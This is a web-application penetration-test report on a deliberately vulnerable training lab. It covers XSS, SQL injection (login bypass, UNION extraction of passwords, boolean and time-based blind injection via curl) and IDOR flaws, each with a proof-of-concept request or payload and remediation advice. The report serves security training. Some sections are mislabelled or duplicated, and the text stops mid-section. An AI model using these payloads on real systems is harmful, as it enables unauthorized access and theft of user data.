# Web Application Vulnerability Assessment Report

---

**Target Application:**  
Deliberately Vulnerable Web Application (Security Training Environment)

**Assessment Type:**  
Web Application Vulnerability Assessment and Penetration Testing (VAPT)

**Tested By:**  
Mridul

**Date:**  
December 2025

---

## Confidentiality Notice

This document contains confidential and sensitive security information related to the assessed application. The contents of this report are intended solely for authorized individuals involved in security review, remediation, and learning purposes.

Unauthorized disclosure, distribution, or reproduction of this report, in whole or in part, without prior written consent is strictly prohibited. Any misuse of the information contained herein may result in security risks to the application and associated systems.

---
## 1. Executive Summary

This report presents the findings of a Web Application Vulnerability Assessment and Penetration Testing (VAPT) exercise conducted on a deliberately vulnerable web application used for security training and assessment purposes.

The primary objective of this engagement was to identify security weaknesses that could be exploited by an attacker to perform unauthorized actions, compromise user accounts, access sensitive information, or abuse application workflows. The assessment focused on validating practical exploitability and real-world attack scenarios rather than theoretical risks.

Testing was performed using a manual, attacker-driven methodology aligned with OWASP Top 10 vulnerability categories and common web exploitation techniques. During the assessment, multiple vulnerability classes were identified, including injection flaws, broken access control, authentication weaknesses, insecure deserialization, and business logic vulnerabilities.

Several of the identified issues allow attackers to bypass security controls, escalate privileges, manipulate application behavior, and perform actions on behalf of other users. If exploited in a real-world environment, these vulnerabilities could result in significant impact to the confidentiality, integrity, and availability of the application.

This report provides a consolidated overview of the identified vulnerabilities, along with proof-of-concept evidence, impact analysis, and remediation guidance to support effective risk mitigation and security improvement.

## 2. Engagement Overview

This Web Application Vulnerability Assessment and Penetration Testing (VAPT) engagement was conducted to identify security vulnerabilities in the target web application through authorized and controlled testing.

The assessment was performed using a **manual, black-box testing approach**, simulating an attacker with no prior knowledge of the application. The focus was on identifying vulnerabilities that could be practically exploited to bypass security controls, access unauthorized data, or abuse application functionality.

Testing activities were limited to the defined scope and were carried out in a controlled lab environment. No denial-of-service testing or actions impacting application availability were performed.

The assessment followed common web application security testing practices aligned with OWASP Top 10 categories and real-world attack techniques.

## 3. Methodology

The assessment was conducted using a manual web application security testing methodology. The focus was on identifying vulnerabilities through direct interaction with the application and validating whether they could be practically exploited.

Testing was performed by analyzing application behavior, manipulating client-side inputs, and observing server-side responses. Common attack techniques such as input injection, access control bypass, authentication abuse, and workflow manipulation were tested across different application functionalities.

The methodology emphasized confirmation of real security impact rather than theoretical weaknesses or automated scan results. Only vulnerabilities with clear exploit paths and observable effects were documented in this report.
## 4. Vulnerability Summary

The assessment identified multiple security vulnerabilities across various components of the application. The findings include a combination of technical implementation flaws, access control weaknesses, authentication issues, and business logic errors that can be exploited without requiring advanced privileges.

The identified vulnerabilities were evaluated based on their potential impact, ease of exploitation, and likelihood of abuse, following commonly accepted industry severity classifications. The assessment covered a total of **52 security labs**, many of which demonstrated recurring vulnerability patterns across different application functionalities.

### 4.1 Severity Breakdown

| Severity | Observed Findings |
|--------|------------------|
| Critical | Multiple |
| High | Multiple |
| Medium | Several |
| Low | Several |
| Informational | Few |

> Note: Similar vulnerability types observed across multiple labs have been consolidated under single findings to avoid duplication and to provide a clearer risk-based overview.

### 4.2 Vulnerability Categories Identified

The following vulnerability categories were identified during the assessment:

- Cross-Site Scripting (XSS)
- SQL Injection
- Insecure Direct Object Reference (IDOR)
- Command Injection
- XML External Entity (XXE)
- File Inclusion
- Unrestricted File Upload
- Cross-Site Request Forgery (CSRF)
- Insecure Deserialization
- Broken Authentication
- Race Condition
- Server-Side Template Injection (SSTI)
- API Hacking
- CAPTCHA Bypass
- Path Traversal

### 4.3 Overall Risk Posture

The overall security posture of the application is assessed as **High Risk**. This assessment is based on the presence of multiple critical and high-impact vulnerabilities that allow unauthorized access, privilege escalation, data exposure, and manipulation of application workflows.

Several vulnerabilities can be combined or chained together to significantly increase attack impact, highlighting systemic security weaknesses rather than isolated implementation errors. Comprehensive remediation and secure development practices are required to reduce the overall risk level.

## 5. Detailed Findings

This section provides a detailed analysis of the security vulnerabilities identified during the assessment. Each finding includes a clear description of the issue, its impact, proof-of-concept evidence, and recommended remediation steps.

For clarity and consistency, vulnerabilities are grouped by category. Each vulnerability category is documented using a standardized format to ensure readability and ease of review.
### 5.1.1 Cross-Site Scripting (XSS)

#### Severity
Medium

#### CVSS v3.1 Score
6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Affected Component
User-supplied input reflected in HTTP responses without proper output encoding.

#### Description
Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject client-side code into web pages viewed by other users. In the identified scenario, user-controlled input is reflected directly in the application’s response without adequate validation or encoding.

This behavior allows an attacker to craft a malicious request containing executable JavaScript code, which is then returned by the server and executed in the victim’s browser when the response is rendered.

#### Root Cause
The application fails to properly sanitize or encode user input before reflecting it back in the HTTP response, allowing injected script content to be interpreted by the browser.

#### Proof of Concept

```http
GET /vulnerable-endpoint?input=<script>alert('2*3')</script> HTTP/1.1
Host: target-application
```
![Basic Reflected XSS – Payload Injection](screenshots/basic_reflt.png)

![Basic Reflected XSS – Payload Injection](screenshots/basic_reflect1.png)

![Basic Reflected XSS – JavaScript Execution](screenshots/basic_reflect2.png)

When the request is processed, the injected script is reflected in the response and executed in the browser.

Impact

Successful exploitation allows an attacker to execute arbitrary JavaScript in the victim’s browser context. This can lead to session hijacking, credential theft, phishing attacks, defacement, or redirection to malicious websites.

Remediation

Apply context-aware output encoding for all user-supplied data.

Validate and sanitize input on the server side.

Implement a strict Content Security Policy (CSP) to reduce XSS impact.

Avoid reflecting raw user input in application responses.

### 5.1.2 Cross-Site Scripting (XSS)

#### Severity
High

#### CVSS v3.1 Score
7.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Affected Component
User-generated content functionality (chat feature).

#### Description
A Stored Cross-Site Scripting (XSS) vulnerability was identified in the chat functionality of the application. User-supplied input submitted through the chat interface is stored on the server and later rendered to other users without proper output encoding.

Because the injected payload is persisted, the malicious script is executed automatically whenever any user views the affected chat messages. As the chat is visible to all users, the impact of this vulnerability is broader compared to reflected XSS.

#### Root Cause
The application stores user input and renders it to other users without applying context-aware output encoding or input sanitization.

#### Proof of Concept

An attacker submits the following payload through the chat input:

```html
<script>alert('Stored XSS')</script>
```
![Stored XSS – Payload Injection](screenshots/stored_mssg.png)

![Stored XSS – Payload Stored in Chat](screenshots/stored_mssg1.png)

![Stored XSS – JavaScript Execution for Other Users](screenshots/store_mssg2.png)

Impact

Successful exploitation allows persistent execution of arbitrary JavaScript in the browsers of all users viewing the chat. This can result in session hijacking, credential theft, phishing attacks, forced actions on behalf of victims, or widespread client-side compromise.

Remediation

Encode all user-generated content before rendering it in the browser.

Apply strict input validation and sanitization on stored data.

Implement a Content Security Policy (CSP) to reduce the impact of XSS.

Avoid rendering raw HTML or script content from user inputs.

### 5.1.3 SQL Injection

#### Severity
High

#### CVSS v3.1 Score
8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
Input fields interacting directly with backend database queries.

#### Description
A SQL Injection vulnerability was identified in the application where user-supplied input is directly incorporated into database queries without proper validation or parameterization. This allows an attacker to manipulate the structure of the SQL query executed by the backend database.

By injecting crafted SQL syntax, an attacker can alter query logic to bypass authentication checks or retrieve sensitive data from the database.

#### Root Cause
The application constructs SQL queries using unsanitized user input and fails to use parameterized queries or prepared statements, allowing injected SQL code to be executed by the database engine.

#### Proof of Concept
An attacker supplies the following input in a vulnerable parameter:

```sql
' OR '1'='1' --
```

![DOM-based XSS – Payload Injection](screenshots/dom.png)

![DOM-based XSS – Client-Side Processing](screenshots/dom1.png)

![DOM-based XSS – JavaScript Execution](screenshots/dom2.png)

### 5.1.4 Cross-Site Scripting (XSS)

#### Severity
Medium

#### CVSS v3.1 Score
6.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Affected Component
HTML attributes constructed using user-controlled input.

#### Description
An HTML Attribute-based Cross-Site Scripting (XSS) vulnerability was identified where user-supplied input is embedded directly into HTML attribute values without proper encoding.

By injecting specially crafted input, an attacker can break out of the intended attribute context and introduce malicious event handlers or JavaScript code. When the affected page is rendered and the user interacts with the element, the injected script is executed in the victim’s browser.

#### Root Cause
The application inserts untrusted user input into HTML attributes without applying context-aware output encoding, allowing attackers to escape the attribute value and inject executable code.

#### Proof of Concept
An attacker supplies the following payload in a vulnerable parameter rendered inside an HTML attribute:

```html
" onmouseover="alert('Attribute XSS')
```

![HTML Attribute XSS – Payload Injection](screenshots/html_attribute_mani.png)

![HTML Attribute XSS – Attribute Manipulation](screenshots/html_attribute_mani1.png)

![HTML Attribute XSS – JavaScript Execution](screenshots/html_attribute_mani2.png)


Impact

Successful exploitation allows execution of arbitrary JavaScript in the victim’s browser context. This may lead to session hijacking, credential theft, phishing attacks, unauthorized actions, or redirection to malicious content.

Remediation

Apply proper context-aware output encoding for HTML attribute values.

Sanitize and validate all user-supplied input on the server side.

Avoid dynamically constructing HTML attributes using raw user input.

Implement a strict Content Security Policy (CSP) to reduce the impact of client-side script execution.

### 5.1.5 Cross-Site Scripting (XSS)

#### Severity
High

#### CVSS v3.1 Score
7.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Affected Component
Gallery page rendering user-controlled input via URL parameters.

#### Description
A Cross-Site Scripting (XSS) vulnerability was identified in the gallery functionality where user-supplied input provided through a URL parameter is processed and rendered without proper validation or output encoding.

The vulnerable parameter allows an attacker to inject malicious JavaScript code, which is executed in the browser when the gallery page is accessed. This allows client-side code execution in the context of the application.

#### Root Cause
The application fails to validate and properly encode user-controlled input received via URL parameters before rendering it in the response.

#### Proof of Concept
An attacker modifies the `img` parameter to inject a malicious payload:

```http
GET /lab/xss/our-gallery/?img=%22%20onerror%3Dalert(1)%20 HTTP/1.1
Host: localhost:1337
```


![HTML Attribute XSS – Payload Injection](screenshots/gallary_1.png)

![HTML Attribute XSS – Attribute Manipulation](screenshots/gallary_2.png)



Impact

Successful exploitation allows an attacker to execute arbitrary JavaScript in the victim’s browser context. This can lead to session hijacking, credential theft, phishing attacks, forced actions on behalf of users, or redirection to malicious websites.

Remediation

Apply strict server-side input validation for all URL parameters.

Implement context-aware output encoding before rendering user input.

Avoid dynamically inserting user-controlled data into HTML without sanitization.

Deploy a Content Security Policy (CSP) to limit the execution of injected scripts

### 5.1.6 Cross-Site Scripting (XSS)

#### Severity
High

#### CVSS v3.1 Score
7.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Affected Component
User-Agent HTTP header logged and rendered in the application interface.

#### Description
A Stored Cross-Site Scripting (XSS) vulnerability was identified in the User-Agent handling functionality. The application records the User-Agent header from incoming HTTP requests and later displays this data within an administrative or logging interface without proper output encoding.

Because the User-Agent header is fully attacker-controlled, a malicious payload can be injected into the header value. Once stored, the payload is executed whenever the affected log or admin page is accessed, resulting in stored client-side code execution.

#### Root Cause
The application trusts and stores the User-Agent HTTP header without validation and renders it in the response without applying context-aware output encoding.

#### Proof of Concept
An attacker intercepts a request and modifies the `User-Agent` header to include a malicious payload:

```http
POST /lab/xss/user-agent/ HTTP/1.1
Host: localhost:1337
User-Agent: <script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded

```
<img width="693" height="329" alt="user_agent2" src="https://github.com/user-attachments/assets/fcbee8d9-ec1b-4538-b4da-83394a610a06" />
<img width="1920" height="1034" alt="user_agent1" src="https://github.com/user-attachments/assets/27d6d65c-db94-4a3e-a20a-1bbe9833a77a" />
<img width="1911" height="952" alt="user_agent" src="https://github.com/user-attachments/assets/f614c728-5ed0-4a23-98af-9d0568509526" />

Impact

Successful exploitation allows persistent execution of arbitrary JavaScript in the context of users viewing the stored logs or administrative interface. This can lead to session hijacking, credential theft, phishing attacks, or unauthorized actions performed on behalf of privileged users.

Remediation

Treat all HTTP headers as untrusted user input.

Apply strict output encoding before rendering header values in any interface.

Avoid rendering raw header values in administrative or log views.

Implement a Content Security Policy (CSP) to reduce the impact of XSS attacks.
### 5.1.7 Cross-Site Scripting (XSS)

#### Severity
High

#### CVSS v3.1 Score
7.2 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

#### Affected Component
News submission and listing functionality.

#### Description
A Stored Cross-Site Scripting (XSS) vulnerability was identified in the News feature of the application. User-supplied input provided through the news submission form is stored by the application and later rendered to all users without proper validation or output encoding.

The vulnerability arises due to insufficient validation of the `News Url` field, which allows the use of a `javascript:` URI scheme. When users interact with the rendered news entry, the injected JavaScript is executed in the browser.

#### Root Cause
The application fails to validate and restrict dangerous URL schemes and does not apply proper output encoding when rendering stored news entries.

#### Proof of Concept
An attacker submits a crafted news entry with a malicious JavaScript URL:

```http
POST /lab/xss/news/ HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded

title=Mridul_chamoli&link=javascript:alert(1)
```
<img width="1920" height="1037" alt="news_2" src="https://github.com/user-attachments/assets/a432a509-63b0-4377-a986-de3229c8a8bd" />
<img width="1920" height="1009" alt="news_1" src="https://github.com/user-attachments/assets/72d2dcf4-54fb-4aa0-87bd-dbb558dc9202" />

Successful exploitation allows an attacker to execute arbitrary JavaScript in the browser context of users interacting with the news feature. This can lead to session hijacking, credential theft, phishing attacks, forced actions, or redirection to malicious content.

Remediation

Enforce strict validation on URL inputs and block dangerous schemes such as javascript:.

Apply context-aware output encoding when rendering user-supplied content.

Implement allowlists for acceptable URL schemes (e.g., http, https).

Deploy a Content Security Policy (CSP) to reduce the impact of XSS attacks.

### 5.1.8 Unrestricted File Upload

#### Severity
Medium

#### CVSS v3.1 Score
6.5 (AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N)

#### Affected Component
Profile image upload functionality.

#### Description
An Unrestricted File Upload vulnerability was identified in the profile image upload feature. The application allows users to upload image files without properly validating the file content and type beyond basic client-side or extension-based checks.

During testing, an SVG file containing embedded JavaScript was successfully uploaded and stored by the application. The uploaded file is later rendered as a profile image, indicating that potentially unsafe file types are accepted and handled without sufficient security controls.

While the injected script may not execute in the current rendering context, accepting and storing unsanitized SVG files introduces a stored Cross-Site Scripting (XSS) risk if the rendering context changes or if the file is accessed directly.

#### Root Cause
The application fails to enforce strict server-side validation of uploaded file types and does not sanitize active content within uploaded files such as SVG images.

#### Proof of Concept
An attacker uploads a crafted SVG file containing embedded script content:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```
<img width="1920" height="938" alt="file_upload" src="https://github.com/user-attachments/assets/18a02177-9552-4a5f-94d6-28ba0f01bf5b" />

Impact

Improper file upload handling may allow attackers to store malicious files on the server. Depending on how the file is rendered or accessed, this could lead to stored XSS, user session compromise, or future exploitation if the file is served with an unsafe MIME type or rendered in a different context.

Remediation

Enforce strict server-side validation of allowed file types using MIME type checks.

Disallow upload of active content formats such as SVG, or sanitize them before storage.

Rename uploaded files and store them outside the web root when possible.

Serve uploaded files with safe content-type headers.

#### 5.2.1 Login (Authentication Bypass)

#### Severity
Critical

#### CVSS v3.1 Score
9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
Administrator login functionality.

#### Description
A SQL Injection vulnerability was identified in the administrator login mechanism. The application directly incorporates user-supplied input into an authentication query without proper sanitization or parameterization.

By injecting crafted SQL syntax into the username field, an attacker can manipulate the authentication logic and bypass credential verification entirely. This results in unauthorized access to the administrator account without knowing valid credentials.

#### Root Cause
The application constructs SQL authentication queries using raw user input and does not implement parameterized queries or prepared statements.

#### Proof of Concept
An attacker supplies the following payload in the username field during login:

```sql
' OR '1'='1' -- 
```
<img width="1920" height="678" alt="automatic_login1" src="https://github.com/user-attachments/assets/b9f7ed18-3ec9-4adc-8d17-dc5078f207ed" />
<img width="1919" height="649" alt="automatic_login" src="https://github.com/user-attachments/assets/d7b7eb2e-120c-4892-a90a-d5b7971fd559" />

Impact

Successful exploitation allows an attacker to bypass authentication controls and gain full administrative access to the application. This can lead to complete compromise of sensitive data, unauthorized modifications, privilege escalation, and potential takeover of the entire application.

Remediation

Use parameterized queries or prepared statements for all authentication logic.

Implement strict server-side input validation.

Apply least-privilege principles for database accounts.

Add monitoring and alerting for failed and suspicious login attempts.

#### 5.2.2 Find the Passwords (Data Extraction)

#### Severity
Critical

#### CVSS v3.1 Score
9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
Search functionality querying user records from the database.

#### Description
A Union-Based SQL Injection vulnerability was identified in the search functionality used to retrieve user records. The application directly incorporates user-supplied input into a SQL query without proper validation or parameterization.

By injecting crafted SQL payloads, an attacker can modify the structure of the original query and retrieve sensitive data from the backend database, including usernames and plaintext or weakly protected passwords.

#### Root Cause
The application constructs SQL queries using unsanitized user input and does not implement prepared statements or parameterized queries, allowing attackers to inject arbitrary SQL commands.

#### Proof of Concept
An attacker injects a malicious payload into the search input to manipulate the SQL query:

```sql
' UNION SELECT id,username,password,4,name,surname FROM users-- -
```
<img width="1815" height="785" alt="Find_the_password1" src="https://github.com/user-attachments/assets/13b02902-3fd7-4727-ad5a-cbcb167fc9e5" />
<img width="1909" height="802" alt="Find_the_password" src="https://github.com/user-attachments/assets/21a8867c-4f1e-43b4-84e3-f08c1a166687" />

Impact

Successful exploitation allows an attacker to extract sensitive data from the database, including usernames, email addresses, and passwords. This can lead to account takeover, privilege escalation, lateral movement, and complete compromise of the application and associated user accounts.

Remediation

Use parameterized queries or prepared statements for all database interactions.

Apply strict server-side input validation.

Restrict database user privileges to the minimum required.

Avoid displaying sensitive data such as passwords in application responses.

Implement monitoring and alerting for abnormal query behavior.

#### 5.2.3 Boolean-Based Blind SQL Injection

#### Severity
High

#### CVSS v3.1 Score
8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

#### Affected Component
Product search / stock check functionality using POST-based input.

#### Description
A Boolean-Based Blind SQL Injection vulnerability was identified in the stock control feature. The application processes user-supplied input from a POST parameter and directly incorporates it into a SQL query without proper sanitization or parameterization.

Although database errors are not displayed in the response, the application exhibits different behavioral responses depending on whether injected Boolean conditions evaluate to true or false. This allows an attacker to infer database information character by character by observing changes in application responses.

#### Root Cause
The application constructs SQL queries using unsanitized user input and does not use prepared statements. Additionally, error messages are suppressed, resulting in a blind SQL injection scenario.

#### Proof of Concept
An attacker injects a Boolean condition into the vulnerable POST parameter:

```sql
iphone11' OR '1'='1
```
<img width="920" height="819" alt="boolean_based_sql1" src="https://github.com/user-attachments/assets/6a7c3967-8177-4d61-911d-675f2a5bd88c" />
<img width="1920" height="927" alt="Boolean_based_sql" src="https://github.com/user-attachments/assets/46e7c127-0484-492e-81c9-800deef78ece" />
iphone11' OR 1=1 AND SUBSTRING(database(),1,1)='s'-- -
Impact

Successful exploitation allows an attacker to extract sensitive database information such as database names, table names, column names, and data values through inference. This can eventually lead to full database compromise, exposure of sensitive information, and further attacks such as authentication bypass.

Remediation

Use parameterized queries or prepared statements for all database operations.

Apply strict server-side input validation.

Implement generic error handling to avoid response-based information leakage.

Apply least-privilege permissions to database accounts.


#### 5.2.4 Error-Based Blind SQL Injection

#### Severity
High

#### CVSS v3.1 Score
8.2 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

#### Affected Component
Car showroom image selection functionality using a GET parameter.

#### Description
An Error-Based Blind SQL Injection vulnerability was identified in the image selection feature of the application. The application accepts user-controlled input via a GET parameter and directly incorporates it into a backend SQL query without proper sanitization.

When malformed or crafted input is supplied, the application reveals database error messages generated by the underlying MariaDB engine. These error messages confirm the presence of SQL Injection and allow attackers to infer database behavior even when query results are not directly returned.

Although full query output is not displayed, the exposure of SQL error messages enables attackers to perform error-based inference attacks to extract database information.

#### Root Cause
The application fails to sanitize user input and exposes raw database error messages in HTTP responses instead of handling them securely.

#### Proof of Concept
An attacker injects malformed input into the vulnerable `img` parameter:

```http
GET /lab/sql-injection/get-blind-error/index.php?img=2%27 HTTP/1.1
Host: localhost:1337
```
<img width="957" height="501" alt="error_based_blind3" src="https://github.com/user-attachments/assets/91177e4a-cf3c-485e-a02b-6740d678685b" />
<img width="961" height="1038" alt="error_based_blind2" src="https://github.com/user-attachments/assets/914ddd77-01dd-4776-a1fe-90501d8a0971" />
<img width="1919" height="1039" alt="error_based_blind1" src="https://github.com/user-attachments/assets/d2a7b31e-09c3-4ba7-80df-33d00c6d62cc" />
<img width="1920" height="938" alt="error_based_blind" src="https://github.com/user-attachments/assets/72a24dd5-e1db-46d5-900e-cfe51dec5ad0" />

Impact

Successful exploitation allows an attacker to gather information about the database structure, backend technology, and query logic through error messages. This information can be leveraged to perform further attacks such as union-based or blind SQL injection, leading to sensitive data exposure and potential full database compromise.

Remediation

Disable detailed database error messages in production environments.

Use parameterized queries or prepared statements for all database interactions.

Validate and sanitize all user-supplied input.

Implement centralized error handling to prevent information leakage. 

#### 5.2.5 Time-Based Blind SQL Injection

#### Severity
High

#### CVSS v3.1 Score
8.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

#### Affected Component
Password reset functionality accepting POST-based input.

#### Description
A Time-Based Blind SQL Injection vulnerability was identified in the password reset feature of the application. User-supplied input provided through a POST parameter is directly incorporated into a backend SQL query without proper sanitization or parameterization.

The application does not return database errors or query results in the response. However, it is possible to inject time-delay functions into the SQL query and observe differences in server response times. These measurable delays confirm that injected SQL code is executed by the database.

#### Root Cause
The application constructs SQL queries using unsanitized user input and does not use prepared statements. Additionally, the absence of error messages results in a blind SQL injection scenario that can still be exploited using timing-based techniques.

#### Proof of Concept
A baseline request is sent to measure normal response time:

```bash
curl -X POST "http://localhost:1337/lab/sql-injection/post-blind-time/" \
--data-urlencode "email=test@test.com" \
-w "\nTime: %{time_total}s\n"
```
A time-delay payload is then injected into the same parameter:

curl -X POST "http://localhost:1337/lab/sql-injection/post-blind-time/" \
--data-urlencode "email=' OR (SELECT SLEEP(5))#" \
-o /dev/null -s \
-w "Injected: %{time_total}s\n"

<img width="725" height="369" alt="time_based_sql" src="https://github.com/user-attachments/assets/c11f16de-973a-45e4-a286-76e935096c0e" />
<img width="1886" height="880" alt="time_based_ql" src="https://github.com/user-attachments/assets/922dbe85-9653-4e82-847a-a84e5de9fce3" />


Impact

Successful exploitation allows an attacker to infer database information through response timing analysis. Over multiple requests, sensitive data such as database names, table structures, and record values can be extracted. This may ultimately lead to full database compromise and further attacks against the application.

Remediation

Use parameterized queries or prepared statements for all database operations.

Apply strict server-side input validation.

Implement generic responses to prevent timing-based inference.

Limit database function usage such as SLEEP() where possible.

Apply least-privilege access controls for database users.

#### 5.3.1 Insecure Direct Object Reference (IDOR) – Invoice Access

#### Severity
High

#### CVSS v3.1 Score
7.7 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

#### Affected Component
Invoice viewing functionality using object identifiers in request parameters.

#### Description
An Insecure Direct Object Reference (IDOR) vulnerability was identified in the invoice access functionality. The application exposes internal invoice identifiers through a request parameter and fails to verify whether the authenticated user is authorized to access the requested invoice.

By modifying the invoice identifier value in the request, an attacker can access invoices belonging to other users without proper authorization checks.

#### Root Cause
The application relies on client-supplied object identifiers to retrieve invoices and does not enforce ownership or authorization validation on the server side.

#### Proof of Concept
An authenticated user accesses their own invoice:

```http
GET /lab/idor/invoices/?invoice_id=10 HTTP/1.1
Host: localhost:1337
```
<img width="954" height="987" alt="invoice_3" src="https://github.com/user-attachments/assets/df3bb90f-f8ba-465e-9945-a2c1ba73d4c9" />
<img width="959" height="1038" alt="invoice_2" src="https://github.com/user-attachments/assets/d019b21f-176b-4bbd-9d70-8af4affadecc" />
<img width="1910" height="908" alt="invoice_1" src="https://github.com/user-attachments/assets/f7a917ed-5cab-45c7-910e-785b16b374cd" />

Impact

Successful exploitation allows attackers to access sensitive financial documents belonging to other users. This may lead to disclosure of personally identifiable information (PII), financial data leakage, privacy violations, and potential regulatory compliance issues.

Remediation

Enforce server-side authorization checks for all object access.

Validate that the authenticated user owns or is permitted to access the requested invoice.

Avoid exposing predictable object identifiers.

Use indirect object references or UUIDs where possible.
#### 5.3.1 Insecure Direct Object Reference (IDOR) – Invoice Access

#### Severity
High

#### CVSS v3.1 Score
7.7 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

#### Affected Component
Invoice viewing functionality using object identifiers in request parameters.

#### Description
An Insecure Direct Object Reference (IDOR) vulnerability was identified in the invoice access functionality. The application exposes internal invoice identifiers through a request parameter and fails to verify whether the authenticated user is authorized to access the requested invoice.

By modifying the invoice identifier value in the request, an attacker can access invoices belonging to other users without proper authorization checks.

#### Root Cause
The application relies on client-supplied object identifiers to retrieve invoices and does not enforce ownership or authorization validation on the server side.

#### Proof of Concept
An authenticated user accesses their own invoice:

```http
GET /lab/idor/invoices/?invoice_id=102 HTTP/1.1
Host: localhost:1337
```
<img width="918" height="815" alt="Ticket_sale1" src="https://github.com/user-attachments/assets/80fdd6e2-dd0c-47f1-be7b-8a45718e627f" />
<img width="918" height="815" alt="ticket_2" src="https://github.com/user-attachments/assets/abd6da4c-8f92-4971-8c4d-b705c9cb35b4" />

By modifying the invoice_id parameter, the user is able to access another user’s invoice:

GET /lab/idor/invoices/?invoice_id=103 HTTP/1.1
Host: localhost:1337

The application returns the requested invoice without verifying ownership.

Impact

Successful exploitation allows attackers to access sensitive financial documents belonging to other users. This may lead to disclosure of personally identifiable information (PII), financial data leakage, privacy violations, and potential regulatory compliance issues.

Remediation

Enforce server-side authorization checks for all object access.

Validate that the authenticated user owns or is permitted to access the requested invoice.

Avoid exposing predictable object identifiers.

Use indirect object references or UUIDs where possible.

### 5.3.2 Insecure Direct Object Reference (IDOR) – Changing Password

#### Severity
High

#### CVSS v3.1 Score
7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

#### Affected Component
Password change functionality.

#### Description
An Insecure Direct Object Reference (IDOR) vulnerability was identified in the password change functionality. The application allows users to change account passwords by submitting a `user_id` parameter in the request.

By modifying the `user_id` value in the request, an attacker can change the password of **other users** without proper authorization checks.

The application does not verify whether the authenticated user is authorized to perform password changes for the specified user ID.

#### Root Cause
The server blindly trusts the client-supplied `user_id` parameter and fails to enforce object-level access control during password change operations.

#### Proof of Concept

**Original Request (Own Account):**
```http
POST /lab/idor/changing-password/ HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded

password=MRIDUL&user_id=1
```
POST /lab/idor/changing-password/ HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded

password=Mridul2&user_id=10
<img width="914" height="895" alt="changing_password1" src="https://github.com/user-attachments/assets/39867964-d5c7-4d9e-8784-c6aa77bb4730" />
<img width="918" height="815" alt="changing_password" src="https://github.com/user-attachments/assets/0927b45f-955c-4eb9-9ecd-df54ad0cab27" />

Impact

Successful exploitation allows an attacker to:

Change passwords of arbitrary users

Take over victim accounts

Escalate privileges

Cause account lockout or denial of service for legitimate users

Remediation

Enforce strict server-side authorization checks.

Ensure users can modify only their own account data.

Do not accept sensitive object identifiers (e.g., user_id) directly from client requests.

Derive user identity from the authenticated session instead of request parameters.

Implement access control checks for all state-changing operations.
### 5.3.4 Insecure Direct Object Reference (IDOR) – Money Transfer

#### Severity
High

#### CVSS v3.1 Score
7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N)

#### Affected Component
Money Transfer functionality handling user-controlled transaction parameters.

#### Description
An Insecure Direct Object Reference (IDOR) vulnerability was identified in the Money Transfer feature.  
The application relies on client-supplied parameters to identify the sender and recipient of a transaction without enforcing proper server-side authorization checks.

By modifying request parameters such as `sender_id`, `recipient_id`, and `transfer_amount`, an attacker can perform unauthorized money transfers from other users’ accounts.

#### Root Cause
The application trusts user-controlled identifiers for sender and recipient accounts and does not validate whether the authenticated user is authorized to initiate transactions on those accounts.

#### Proof of Concept
An attacker intercepts and modifies the money transfer request:

```http
POST /lab/idor/money-transfer/index.php HTTP/1.1
Host: localhost:1337
Content-Type: application/x-www-form-urlencoded

transfer_amount=1000&recipient_id=1&sender_id=3
```
<img width="1900" height="873" alt="money_transfer1" src="https://github.com/user-attachments/assets/f2f21231-0eeb-4760-8bd7-bc37244329cb" />
<img width="1917" height="928" alt="money_transfer" src="https://github.com/user-attachments/assets/2871791e-4e7d-4eb0-9384-8bf908338eff" />

#### 5.3.5 Insecure Direct Object Reference (IDOR) – Address Entry

#### Severity
High

#### CVSS v3.1 Score
8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
Order confirmation and address entry functionality using `addressID` parameter.

#### Description
An Insecure Direct Object Reference (IDOR) vulnerability was identified in the address entry feature of the application. The application allows authenticated users to update and select delivery addresses by submitting an `addressID` parameter during order confirmation.

The server does not verify whether the supplied `addressID` belongs to the currently authenticated user. By modifying this parameter in the request, an attacker can place orders using another user’s saved address and identity.

#### Root Cause
The application relies on client-supplied object identifiers (`addressID`) without implementing proper server-side authorization checks. There is no validation to ensure that the referenced address is owned by the authenticated user.

#### Proof of Concept
A legitimate order request uses the attacker’s own address ID:

address=<addressID=1&order=rubber_duck

css
Copy code

By modifying the `addressID` value to reference another user’s address:

address=<addressID=4&order=rubber_duck
<img width="925" height="820" alt="address_entry1" src="https://github.com/user-attachments/assets/2911972b-9db2-4de7-ab8b-973e58812cab" />
<img width="927" height="819" alt="address_entry" src="https://github.com/user-attachments/assets/dbd49f5f-8627-4e02-8890-69d042dea415" />
#### 5.3.6 Insecure Direct Object Reference (IDOR) – About Profile

#### Severity
High

#### CVSS v3.1 Score
8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

#### Affected Component
User profile “About” page and profile update functionality using the `userid` parameter.

#### Description
